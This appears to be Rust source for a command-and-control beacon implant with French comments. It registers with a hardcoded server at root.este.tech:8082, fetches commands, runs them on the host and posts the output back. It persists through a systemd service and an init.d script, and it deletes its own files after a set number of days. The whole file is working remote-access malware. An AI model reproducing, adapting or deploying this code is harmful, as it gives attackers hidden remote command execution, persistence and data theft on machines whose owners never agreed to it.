use std::{process::Command, fs::{File, self}, io::Write, ops::Sub, time::Duration, thread::sleep};
use chrono::{ Utc, DateTime};use reqwest::{Error};
use serde::{Deserialize, Serialize};

#[derive(Deserialize, Serialize, Debug)]
struct BeaconCommande {
    id: i32,
    command: String,
    created_at: String,
    done: bool
}
impl BeaconCommande {
    fn new(id: i32, command: String, created_at: String, done: bool) -> Self { Self { id, command, created_at, done } }
}

#[derive(Deserialize, Serialize, Debug)]
struct ResultatBeacon {
    command_id: i32,
    agent_id: i32,
    result_content: String
}
impl ResultatBeacon {
    fn new(command_id: i32, agent_id: i32, result_content: String) -> Self { Self { command_id, agent_id, result_content } }
}

#[derive(Deserialize, Serialize, Debug)]
struct Beacon {
    id: i32,
    created_at: String
}
impl Beacon {
    fn new(id: i32, created_at: String) -> Self { Self { id, created_at } }
}


fn main() {

    apply_timer(3,60);
    auto_destruction();

}


/// Préparer une commande de type Command
fn call_commande (commande_string: &str) -> Command{
    let mut commandes: Vec<&str> = commande_string.split(" ").collect();
    commandes.reverse();
    let nom_commande = commandes.pop().unwrap().to_string();
    commandes.reverse();

    let mut commande = Command::new(nom_commande);

    for args in commandes {
        commande.arg(args);
    }

    commande

}


/// But : Récupérer le résultat d'une commande sous forme de chaîne de caractère
fn get_output_from_command_to_string(mut commande: Command) -> String {
    let output = commande.output()
                                .expect("command didnt work")
                                .stdout;
    String::from_utf8(output).unwrap()
}



/// But : Executer une commande sur le terminal 
fn spawn_command(mut commande : Command){
    commande.spawn()
            .expect("commande didnt work");
}





/// But : Créer un script qui execute cet executable et Créer un service qui Executera ce script au démarrage de l'ordinateur 
fn create_shortcut(path: String){
    
    let script_service = b"[Service]\nDescription = Beacon\nType = oneshot\nRemainAfterExit = yes\nExecStart = /etc/init.d/beacon.sh\n\n[Install]\nWantedBy = multi-user.target";


    create_file("/etc/init.d/beacon.sh", path.as_bytes()); 
    create_file("/lib/systemd/system/beacon.service", script_service); 

}


/// But : Créer un fichier sur le chemin "path" et y écrire le "contenu", renvoie le fichier pour une utilisation future
fn create_file(path: &str,content:&[u8])->File{
    let mut file = File::create(path).unwrap();
    file.write_all(content).unwrap();
    file
}

 
/// But : Regarder si le fichier date.txt existe sinon il le créé ainsi que les script et shortcut de l'executable, renvoie la premiere ligne du fichier date.txt
fn open_or_create_file_date(nom_fichier: &str, content:&[u8]) -> String{
    let greeting_file_result = fs::read_to_string(nom_fichier);

    match greeting_file_result {
        Ok(line) => line,
        Err(_error) => {
            sleep(Duration::from_secs(2));
            create_file(nom_fichier, content);
            create_shortcut(get_output_from_command_to_string(call_commande("readlink -f beacon")));
            open_or_create_file_date(nom_fichier,content)
        },
    }
}



/// But : obtenir le nombre de seconde separant les deux dates
fn match_two_date(date_1:String, date_2:String) -> i64{
    let res = DateTime::parse_from_rfc2822(&date_1).unwrap() ;
    let res_2 = DateTime::parse_from_rfc2822(&date_2).unwrap();
    res.sub(res_2).num_days()
}


/// But : obtenir le nombre de seconde separant la date actuel et la date présente dans date.txt
fn get_last_connexion() -> i64 {
    let now = Utc::now().to_rfc2822();
    let date = open_or_create_file_date("date.txt", now.as_bytes()); 
    match_two_date(now, date)
}

/// effectue une requete get sur le serveur, recoit un json convertit en struct Beacon
async fn get_beacon() -> Result<Beacon, Error>{
    let body = reqwest::get("http://root.este.tech:8082/register")
    .await?
    .text()
    .await?;

    let json_test = serde_json::from_str::<Beacon>(&body).unwrap();

    Ok(json_test)
}

/// Créé l'environnement d'execution + Execution de get_beacon_commande
fn apply_request_get_beacon() ->Beacon {
    let rt = tokio::runtime::Runtime::new().unwrap();
    match rt.block_on(get_beacon()) {
        Ok(resultat) => {println!("{:?}",resultat);
    resultat},

        Err(_error) => {
            Beacon::new(0,"date".to_string())
        },
    } 
}

/// effectue une requete get sur le serveur, recoit un json convertit en struct BeaconCommande
async fn get_beacon_commande(beacon:Beacon) -> Result<BeaconCommande, Error>{
    let body = reqwest::get("http://root.este.tech:8082/command/".to_owned() + &beacon.id.to_string())
    .await?
    .text()
    .await?;

    let json_test = serde_json::from_str::<BeaconCommande>(&body).unwrap();

    Ok(json_test)
}

/// Créé l'environnement d'execution + Execution de get_beacon_commande
fn apply_request_get_beacon_commande(beacon:Beacon) ->BeaconCommande {
    let rt = tokio::runtime::Runtime::new().unwrap();
    match rt.block_on(get_beacon_commande(beacon)) {
        Ok(resultat) => {println!("{:?}",resultat);
    resultat},

        Err(_error) => {
            BeaconCommande::new(0,"ls -al".to_string(), "0".to_string(), false)
        },
    } 
}

/// effectue une requete post sur le serveur, envoie une struc Resultat Beacon sous forme de json
async fn post_result(beacon_result: ResultatBeacon) -> Result<(), Error>{
    let client = reqwest::Client::new();
    client.post("http://root.este.tech:8082/result")
    .json(&beacon_result)
    .send()
    .await?;

    Ok(())
}

/// Créé l'environnement d'execution + Execution de post_result
fn apply_request_post_rest(objet: ResultatBeacon) {
        let rt = tokio::runtime::Runtime::new().unwrap();
        match rt.block_on(post_result(objet)) {
            Ok(resultat) => resultat,
            Err(error) => {println!("pas de connexion avec l'erreur : {}",error)
            },
        } 
}




/// But : Détruire les fichiers date.txt, beacon.service, beacon.sh, beacon.exe
fn auto_destruction(){
    spawn_command(call_commande("rm date.txt"));
    spawn_command(call_commande("rm /lib/systemd/system/beacon.service")); // rm /lib/systemd/system/beacon.service
    spawn_command(call_commande("rm /etc/init.d/beacon.sh")); // rm /etc/init.d/beacon.sh
    spawn_command(call_commande("rm beacon"));
}


/// But : appliquer une fonction qui s'execute toute les "intervals" secondes jusqu'à atteindre max
fn apply_timer(max:i64, interval: u64){
        let mut n = get_last_connexion();

        while n <= max {
            sleep(Duration::from_secs(interval));
            n = get_last_connexion();
            let beacon = apply_request_get_beacon();
            let beacon_id = beacon.id;

            let beacon_commande = apply_request_get_beacon_commande(beacon);
            let resultat_commande = get_output_from_command_to_string(call_commande(&beacon_commande.command));
            
            let toto = ResultatBeacon::new(beacon_commande.id, beacon_id, resultat_commande);

            apply_request_post_rest(toto);


        }
}